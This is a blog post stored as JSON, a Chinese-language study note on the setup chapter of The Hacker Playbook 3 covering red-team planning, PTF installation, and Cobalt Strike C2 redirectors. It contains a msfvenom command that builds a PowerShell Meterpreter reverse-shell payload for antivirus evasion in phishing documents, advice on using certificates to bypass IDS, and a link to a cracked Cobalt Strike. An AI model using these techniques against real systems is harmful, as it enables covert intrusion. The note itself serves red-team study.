{"title":"THE HACKER PLAYBOOK 3 -- 笔记 -- 安装","slug":"THE-HACKER-PLAYBOOK-3-笔记-安装","date":"2019-03-28T02:05:11.000Z","updated":"2019-03-30T04:51:31.727Z","comments":true,"path":"api/articles/THE-HACKER-PLAYBOOK-3-笔记-安装.json","photos":[],"link":"","excerpt":"第一章 赛前准备 – 安装前置名词解释：检测时效（TTD）：这是从入侵事件的初始发生到安全分析人员检测并开始处理入侵事件之间的时间。缓解时效（TTM）：当进行防火墙阻止入侵，DNS污染，或者网络隔绝这些操作的时候，会记录这个时间。","covers":["https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_exe.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_C2重定向.png","https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_重定向_ssl.png"],"content":"<h1 id=\"第一章-赛前准备-–-安装\"><a href=\"#第一章-赛前准备-–-安装\" class=\"headerlink\" title=\"第一章 赛前准备 – 安装\"></a>第一章 赛前准备 – 安装</h1><h3 id=\"前置\"><a href=\"#前置\" class=\"headerlink\" title=\"前置\"></a>前置</h3><p><strong>名词解释：</strong></p>\n<ul>\n<li>检测时效（TTD）：这是从入侵事件的初始发生到安全分析人员检测并开始处理入侵事件之间的时间。</li>\n<li>缓解时效（TTM）：当进行防火墙阻止入侵，DNS污染，或者网络隔绝这些操作的时候，会记录这个时间。</li>\n</ul>\n<a id=\"more\"></a>\n<p><strong>作者希望读者把注意力集中于：</strong></p>\n<ul>\n<li>应用程序的安全漏洞而不是信息技术的漏洞</li>\n<li>模拟真实世界的入侵事件</li>\n<li>为红队持续的发展做出极大努力</li>\n<li>挑战所有的安全系统…提供真实的数据来证明安全漏洞</li>\n</ul>\n<p><strong><a href=\"https://attack.mitre.org/matrices/enterprise/windows/\" target=\"_blank\" rel=\"noopener\">APT攻击的 ATT&amp;CK 矩阵</a></strong></p>\n<h3 id=\"设定你的行动\"><a href=\"#设定你的行动\" class=\"headerlink\" title=\"设定你的行动\"></a>设定你的行动</h3><p>在红队活动中，我们从几个目标开始。包括但不限于：</p>\n<ul>\n<li>最终的目标是什么？只是APT检测吗？是要在服务器上获取标志吗？是从数据库中获取数据吗？或者只是为了得到检测时效指标？</li>\n<li>是否有我们想要复制的公共活动？</li>\n<li>你会用什么技巧？如MITRE ATT&amp;CK矩阵，在每个类别中确切的技术是什么？<ul>\n<li><a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md\" target=\"_blank\" rel=\"noopener\">金丝雀研究小组提供了每一种技术的详细信息。</a></li>\n</ul>\n</li>\n<li>客户希望你使用什么工具？是一些诸如Metasploit、Cobalt Strike、DNS Cat这样的商业攻击工具软件？还是自制的定制化工具？</li>\n</ul>\n<p>被抓住也是评估的一部分。。。<br>有一些入侵中作者会被抓4到5次，所以心态要放正。</p>\n<h3 id=\"设置你的外部服务器\"><a href=\"#设置你的外部服务器\" class=\"headerlink\" title=\"设置你的外部服务器\"></a>设置你的外部服务器</h3><p>购买一个合适的VPS。<br>搭建服务器的一个快速方法是集成TrustedSec公司的渗透测试框架（PTF）.<br><a href=\"https://github.com/trustedsec/ptf\" target=\"_blank\" rel=\"noopener\">PTF框架</a>是一些脚本的集合可以为你做大量的艰苦工作并为其他所有内容创建一个框架。</p>\n<ul>\n<li>sudo su -</li>\n<li>apt-get update</li>\n<li>apt-get install python</li>\n<li>git clone <a href=\"https://github.com/trustedsec/ptf\" target=\"_blank\" rel=\"noopener\">https://github.com/trustedsec/ptf</a> /opt/ptf</li>\n<li>cd /opt/pth &amp;&amp; ./ptf</li>\n<li>use modules/exploitation/install_update_all</li>\n<li>use modules/intelligence-gathering/install_update_all</li>\n<li>use modules/post-exploitation/install_update_all</li>\n<li>use modules/powershell/install_update_all</li>\n<li>use modules/vulnerability-analysis/install_update_all</li>\n<li>cd /pentest</li>\n</ul>\n<h3 id=\"红队的核心工具\"><a href=\"#红队的核心工具\" class=\"headerlink\" title=\"红队的核心工具\"></a>红队的核心工具</h3><h4 id=\"Metasploit-框架\"><a href=\"#Metasploit-框架\" class=\"headerlink\" title=\"Metasploit 框架\"></a>Metasploit 框架</h4><p>这个社区驱动的框架，似乎每天更新，拥有所有最新的公开漏洞的利用、后渗透利用模块、辅助模块等等。</p>\n<h5 id=\"混淆-Meterpreter-的-Payload\"><a href=\"#混淆-Meterpreter-的-Payload\" class=\"headerlink\" title=\"混淆 Meterpreter 的 Payload\"></a>混淆 Meterpreter 的 Payload</h5><p>社工时，可能会使用Word或Excel文档作为我们的payload的载体。<br>但是，包含Meterpreter的payload的二进制文件或让目标机器从web下载的操作，会被杀毒软件拦截。<br>所以，我们可以使用PowerShell绕过<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter_reverse_http -f psh -o meterpreter-64.ps1 LHOST=127.0.0.1 LPORT 555</span><br></pre></td></tr></table></figure></p>\n<p>对比：<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_exe.png\" alt=\"\"><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_ps1.png\" alt=\"\"></p>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode\" target=\"_blank\" rel=\"noopener\">此外，使用受信任的机构签发的SSL/TLS证书可以帮助我们绕过某些网络中的IDS(入侵检测系统)</a></p>\n<p><strong><a href=\"https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html\" target=\"_blank\" rel=\"noopener\">利用SSL/TLS证书绕过IDS原理</a></strong><br><strong>SSL/TLS证书：</strong></p>\n<p>SSL 是指安全套接字层，可确保在用户和站点之间，或两个系统之间传输的数据无法被读取。它使用加密算法打乱传输中的数据，防止数据通过连接传输时被黑客读取。这里所说的数据是指任何敏感或个人信息，例如信用卡号和其他财务信息、个人姓名和住址等。</p>\n<p>TLS（传输层安全）是更为安全的升级版 SSL。由于 SSL 这一术语更为常用，因此我们仍然将我们的安全证书称作 SSL。有 ECC、RSA 或 DSA 等加密方式。</p>\n<p><strong>证书生成：</strong><br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\</span><br><span class=\"line\">    -subj <span class=\"string\">\"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\"</span> \\</span><br><span class=\"line\">    -keyout www.example.com.key \\</span><br><span class=\"line\">    -out www.example.com.crt &amp;&amp; \\</span><br><span class=\"line\">cat www.example.com.key  www.example.com.crt &gt; www.example.com.pem &amp;&amp; \\</span><br><span class=\"line\">rm -f www.example.com.key  www.example.com.crt</span><br><span class=\"line\"><span class=\"string\">\"\"</span><span class=\"string\">\" </span></span><br><span class=\"line\"><span class=\"string\">命令解析</span></span><br><span class=\"line\"><span class=\"string\">req： PKCS＃10证书请求和证书生成实用程序</span></span><br><span class=\"line\"><span class=\"string\">-new: 新的请求</span></span><br><span class=\"line\"><span class=\"string\">-newkey rsa:4096： 生成一个4096长度的RSA私钥文件，用于签发</span></span><br><span class=\"line\"><span class=\"string\">-days：证书的有效时间</span></span><br><span class=\"line\"><span class=\"string\">-nodes：如果该选项被指定，如果私钥文件已经被创建则不用加密。</span></span><br><span class=\"line\"><span class=\"string\">-x509：输出一个x509格式的证书</span></span><br><span class=\"line\"><span class=\"string\">-subj：用于指定生成的证书请求的用户信息，或者处理证书请求时用指定参数替换。</span></span><br><span class=\"line\"><span class=\"string\">-keyout：处理结束后输出的KEY文件</span></span><br><span class=\"line\"><span class=\"string\">-out：处理结束后输出的证书文件</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Cobalt-Strike\"><a href=\"#Cobalt-Strike\" class=\"headerlink\" title=\"Cobalt Strike\"></a>Cobalt Strike</h4><p>主要用在后期持久渗透、横向移动、流量隐藏、数据窃取。<br>此工具没有直接的漏洞利用，也没有通过最新的0-Day漏洞来破坏系统。<br><a href=\"https://www.cnblogs.com/ssooking/p/9825917.html\" target=\"_blank\" rel=\"noopener\">破解版地址 ===&gt; 持续更新</a></p>\n<h5 id=\"Cobalt-Strike基础设施\"><a href=\"#Cobalt-Strike基础设施\" class=\"headerlink\" title=\"Cobalt Strike基础设施\"></a>Cobalt Strike基础设施</h5><p>在基础设施方面，我们希望设置这样一个可重用且高度灵活的环境。<br>Cobalt Strike支持重定向，当你的Cobalt Strike使用的C2域名被销毁了，你不需要创建并启用一个新的环境，只需要替换一个新的C2域名。<br>使用socat配置这些重定向器的信息：</p>\n<p><a href=\"https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/\" target=\"_blank\" rel=\"noopener\">参考一</a></p>\n<p><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_C2重定向.png\" alt=\"利用C2\"></p>\n<p><a href=\"https://bluescreenofjeff.com/2018-04-12-https-payload-and-c2-redirectors/\" target=\"_blank\" rel=\"noopener\">参考二</a></p>\n<p><a href=\"http://man.linuxde.net/iptables\" target=\"_blank\" rel=\"noopener\">iptables命令_Linux</a></p>\n<p><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_重定向_ssl.png\" alt=\"重定向-ssl\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p>文中的超链接都是原文地址。不一一列出。</p>\n","categories":[],"tags":[{"name":"THE-HACKER-PLAYBOOK-3","slug":"THE-HACKER-PLAYBOOK-3","count":1,"path":"api/tags/THE-HACKER-PLAYBOOK-3.json"}]}